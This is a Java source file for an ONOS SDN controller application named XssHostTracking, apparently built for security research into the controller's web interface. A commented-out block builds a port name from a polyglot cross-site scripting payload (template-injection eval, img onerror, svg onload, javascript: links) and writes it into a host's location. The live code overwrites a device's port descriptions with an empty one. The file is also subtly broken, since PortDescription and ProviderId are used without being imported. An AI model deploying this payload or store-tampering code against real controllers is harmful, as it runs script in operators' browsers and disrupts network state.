/*
 * Copyright 2022-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.onosproject.xsshosttracking;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.host.HostStore;
import org.onosproject.net.Host;
import org.onosproject.net.HostId;
import org.onosproject.net.HostLocation;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.Device;
import org.onosproject.net.DeviceId;
import org.onosproject.net.Port;
import org.onosproject.net.PortNumber;
import org.onosproject.core.ApplicationId;
import java.util.Timer;
import java.util.Random;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.TimerTask;
import org.onosproject.net.device.DefaultPortDescription;

/**
 * XSS Host Tracking Application.
 */
@Component(immediate = true)
public class XssHostTracking {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostStore hostStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceStore deviceStore;

    Timer timer = new Timer();
    TimerTask timerTask = new TimerTask() {
        @Override
        public void run() {
            log.info("Time up, running Task!");
            editHostStore();
        }
    };

    // --------------------------------------------------------
    // CHANGE THIS PARAMETER TO TRIGGER THE APP EVERY X MILLISECONDS.
    // --------------------------------------------------------
    private static final long TIMEOUT = 10000;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.xsshosttracking.app", () -> log.info("Periscope down."));
        // startTimer(TIMEOUT);
        editHostStore();
        log.info("Started xsshosttracking App!");
    }

    @Deactivate
    protected void deactivate() {
        // timer.cancel();
        // timer.purge();
        log.info("Stopped xsshosttracking App!");
    }

    // editHostStore mess up with the Host Data Store.
    private void editHostStore() {

        // --- INJECT XSS PAYLOAD IN HOST LOCATION ---
        /*
         * getHosts();
         * HostId h1 = getHost(0).id();
         * getHosts();
         * log.info("XSS Host Tracking App: Selected host {}", h1);
         * Set<HostLocation> locationsH1 = getLocations(h1);
         * log.info("XSS Host Tracking App: Locations {}", locationsH1);
         * HostLocation oldLocationH1 = locationsH1.iterator().next();
         * // here create newLocationH1
         * Iterable<Device> devices = deviceService.getDevices();
         * DeviceId s1 = devices.iterator().next().id();
         * PortNumber pn = PortNumber.portNumber(1337,
         * "\"{{1+1}} {{7*7}} {{\'a\'.constructor.prototype.charAt=[].join;eval(\'x=1} } };alert(1)//\');}} <noscript/><img src=url404 onerror=alert(10)>, <noembed><noembed/><img src=url404 onerror=alert(11)>, <option><style></option></select><img src=url404 onerror=alert(12)></style> <svg/onload=alert(1)><svg> <svg\nonload=alert(1)><svg> <svg	onload=alert(1)><svg> <svg onload=alert(1)><svg> img src=# usemap=#foo width=100%><map name=\"foo\"><area href=javascript:alert(document.domain) shape=default> <svg><use xlink:href=javascript:alert(document.domain) /></svg>"
         * );
         * HostLocation newLocationH1 = new HostLocation(s1, pn,
         * System.currentTimeMillis());
         * hostStore.appendLocation(h1, newLocationH1);
         * log.info("XSS Host Tracking App: Locations {}", getLocations(h1));
         * hostStore.removeLocation(h1, oldLocationH1);
         * log.info("XSS Host Tracking App: Locations {}", getLocations(h1));
         */
        Iterable<Device> devices = deviceService.getDevices();
        DeviceId s1 = devices.iterator().next().id();
        List<PortDescription> pd = new ArrayList<PortDescription>();
        DefaultPortDescription dpd = DefaultPortDescription.builder().build();
        pd.add(dpd);
        deviceStore.updatePorts(ProviderId.NONE, s1, pd);
    }

    // startTimer starts a timer that timeouts every X seconds.
    private void startTimer(long timeout) {
        timer.scheduleAtFixedRate(timerTask, 0, timeout);
    }

    private Set<HostLocation> getLocations(HostId hID) {
        Host h = hostService.getHost(hID);
        Set<HostLocation> locations = h.locations();
        return locations;
    }

    private void emptyLocation(HostId hID) {
        Host h = hostService.getHost(hID);
        Set<HostLocation> locations = h.locations();
        for (HostLocation location : locations) {
            hostStore.removeLocation(hID, location);
        }
    }

    // pickRandomHost picks a random host
    private Host pickRandomHost() {
        Iterable<Host> hosts = hostService.getHosts();
        Random rand = new Random();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(rand.nextInt(hostList.size()));

        return randomHost;
    }

    // getHost picks a random host
    private Host getHost(int i) {
        Iterable<Host> hosts = hostService.getHosts();
        Random rand = new Random();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(i);

        return randomHost;
    }

    // getHosts
    private void getHosts() {
        Iterable<Host> hosts = hostService.getHosts();
        Random rand = new Random();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        for (int i = 0; i < hostList.size(); i++) {
            log.info(hostList.get(i).toString());
        }
    }

    // pickRandomDevice picks a random device
    private Device pickRandomDevice() {
        Iterable<Device> devices = deviceService.getDevices();
        Random rand = new Random();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        Device randomDevice = deviceList.get(rand.nextInt(deviceList.size()));

        return randomDevice;
    }

    // getDeviceHosts() logs all the connected hosts for all the devices.
    private void getDeviceHosts() {
        Iterable<Device> devices = deviceService.getDevices();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        for (Device d : deviceList) {
            Set<Host> hosts = hostService.getConnectedHosts(d.id());
            log.info("Hosts connected to device {} : {}", d.id(), hosts.toString());
        }
    }

    // pickRandomPort picks a random port of a device
    private Port pickRandomPort(List<Port> ports) {
        Random rand = new Random();
        Port randomPort = ports.get(rand.nextInt(ports.size()));

        return randomPort;
    }
}
